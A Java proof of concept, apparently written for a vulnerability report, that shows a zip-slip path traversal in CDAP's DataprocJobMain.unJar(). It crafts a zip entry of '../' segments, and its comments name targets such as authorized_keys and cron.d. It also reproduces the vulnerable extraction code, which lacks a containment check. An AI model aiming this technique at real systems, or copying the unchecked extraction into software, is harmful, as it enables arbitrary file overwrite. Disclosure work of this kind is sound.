import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Collection;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Drives the REAL expandArchives()/unpack()/unJar() methods from
 * cdap-runtime-ext-dataproc/.../runtimejob/DataprocJobMain.java (cdapio/cdap, commit
 * fb726c938e0668f1e8e30cb4734281033e86d968, 2026-11-24), extracted byte-exact
 * (sed -n '221,258p' DataprocJobMain.java, self-verified via cmp against the live checkout -
 * see extracted_DataprocJobMain_unJar.txt) with no logic changes whatsoever - only the
 * surrounding class/imports needed to compile these three methods in isolation, since the
 * rest of DataprocJobMain.java pulls in the full Hadoop/YARN/Twill/logback dependency tree
 * via unrelated code paths (DataprocRuntimeEnvironment) that these three methods never touch.
 */
public class ZipSlipDataprocJobMainPoc {

  private static final Logger LOG = LoggerFactory.getLogger(ZipSlipDataprocJobMainPoc.class);

  // ===== BEGIN byte-exact extraction from DataprocJobMain.java lines 221-258 =====

  private static void expandArchives(Collection<String> archiveNames) throws IOException {
    for (String archive : archiveNames) {
      unpack(Paths.get(archive));
    }
  }

  private static void unpack(Path archiveFile) throws IOException {
    if (!Files.isRegularFile(archiveFile)) {
      LOG.warn("Skip archive expansion due to {} is not a file", archiveFile);
      return;
    }
    unJar(archiveFile);
  }

  private static void unJar(Path archiveFile) throws IOException {
    Path targetDir = archiveFile.resolveSibling(archiveFile.getFileName() + ".tmp");
    LOG.debug("Expanding archive {} to {}", archiveFile, targetDir);

    try (ZipInputStream zipIn = new ZipInputStream(Files.newInputStream(archiveFile))) {
      Files.createDirectories(targetDir);

      ZipEntry entry;
      while ((entry = zipIn.getNextEntry()) != null) {
        Path output = targetDir.resolve(entry.getName());

        if (entry.isDirectory()) {
          Files.createDirectories(output);
        } else {
          Files.createDirectories(output.getParent());
          Files.copy(zipIn, output);
        }
      }
    }

    Files.deleteIfExists(archiveFile);
    Files.move(targetDir, archiveFile);
    LOG.debug("Archive expanded to {}", targetDir);
  }

  // ===== END byte-exact extraction =====

  public static void main(String[] args) throws Exception {
    Path sandbox = Files.createTempDirectory("dataproc-zipslip-poc");
    // Simulates where DataprocJobMain actually runs this: the Dataproc job's own working
    // directory on the real cluster VM (e.g. /tmp or the YARN/Dataproc container's local dir).
    Path workDir = sandbox.resolve("job-working-dir");
    Files.createDirectories(workDir);

    // A location clearly OUTSIDE the intended extraction target, standing in for a real
    // sensitive path on a Dataproc VM (e.g. ~/.ssh/authorized_keys, a cron.d entry, a
    // systemd unit) - chosen here only so the PoC is self-contained and safely confined to
    // the temp sandbox; the zip-slip mechanism itself is identical regardless of target.
    Path victimMarker = sandbox.resolve("outside-extraction-dir").resolve("pwned.txt");

    // Craft the malicious "archive" exactly as it would arrive as one of DataprocJobMain's
    // --archive resources (a real zip, real ZipOutputStream, nothing fabricated) - one
    // classic zip-slip entry name, pure path traversal, no exotic tricks needed.
    Path maliciousArchive = workDir.resolve("payload.zip");
    Path targetDir = maliciousArchive.resolveSibling(maliciousArchive.getFileName() + ".tmp");
    // How many directory levels "up" from the real extraction target (targetDir) reach the
    // common ancestor (sandbox) that victimMarker also lives under.
    int upCount = sandbox.relativize(targetDir).getNameCount();
    StringBuilder traversal = new StringBuilder();
    for (int i = 0; i < upCount; i++) {
      traversal.append("../");
    }
    String entryName = traversal.toString() + sandbox.relativize(victimMarker).toString();

    try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(maliciousArchive))) {
      zos.putNextEntry(new ZipEntry(entryName));
      zos.write("written by the attacker, outside the intended extraction directory\n"
          .getBytes("UTF-8"));
      zos.closeEntry();
    }

    System.out.println("Sandbox:          " + sandbox);
    System.out.println("Intended extract target (archive + \".tmp\"): " + targetDir);
    System.out.println("Malicious entry name in the zip: " + entryName);
    System.out.println("Target file OUTSIDE the extraction dir: " + victimMarker);
    System.out.println("Exists before running unJar()?   " + Files.exists(victimMarker));
    System.out.println();

    // This is the exact call DataprocJobMain.main() makes:
    //   expandArchives(arguments.getOrDefault(ARCHIVE, Collections.emptySet()));
    // with "archive" being the localized filename of one of the job's shipped resources.
    expandArchives(java.util.Collections.singleton(maliciousArchive.toString()));

    System.out.println();
    System.out.println("Exists AFTER running the real unJar()? " + Files.exists(victimMarker));
    if (Files.exists(victimMarker)) {
      System.out.println("Content: " + Files.readString(victimMarker).trim());
      System.out.println();
      System.out.println("BUG CONFIRMED: the real, unmodified DataprocJobMain.unJar() wrote a file");
      System.out.println("outside its own intended extraction directory (archive name + \".tmp\"),");
      System.out.println("entirely via the zip entry's own name - no normalization, no startsWith()");
      System.out.println("containment check, unlike the sibling BundleJarUtil.unJar() in the same");
      System.out.println("codebase, which has exactly this check (see report.md).");
    } else {
      System.out.println("NOT reproduced.");
    }
  }
}
